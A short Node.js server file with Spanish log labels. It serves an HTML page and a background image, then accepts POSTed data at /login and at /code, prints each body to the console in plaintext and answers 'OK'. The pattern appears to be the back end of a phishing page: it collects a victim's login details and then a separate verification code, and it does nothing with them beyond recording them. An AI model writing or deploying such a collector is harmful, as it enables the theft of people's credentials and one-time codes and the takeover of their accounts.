const http = require('http');
const fs = require('fs');

const server = http.createServer((req, res) => {

  if (req.url === '/') {
    res.writeHead(200, {'Content-Type': 'text/html'});
    res.end(fs.readFileSync('index.html'));
  }
else if (req.url === '/fondo.jpg') {
  fs.readFile('fondo.jpg', (err, data) => {
    res.writeHead(200, { 'Content-Type': 'image/jpeg' });
    res.end(data);
  });
}
  else if (req.method === 'POST' && req.url === '/login') {
    let body = '';
    req.on('data', chunk => body += chunk.toString());
    req.on('end', () => {
      console.log('LOGIN:', body);
      res.end('OK');
    });
  }

  else if (req.method === 'POST' && req.url === '/code') {
    let body = '';
    req.on('data', chunk => body += chunk.toString());
    req.on('end', () => {
      console.log('CODIGO:', body);
      res.end('OK');
    });
  }

  else {
    res.writeHead(404);
    res.end('Not found');
  }

});

server.listen(3000);
console.log('Servidor listo: http://localhost:3000');
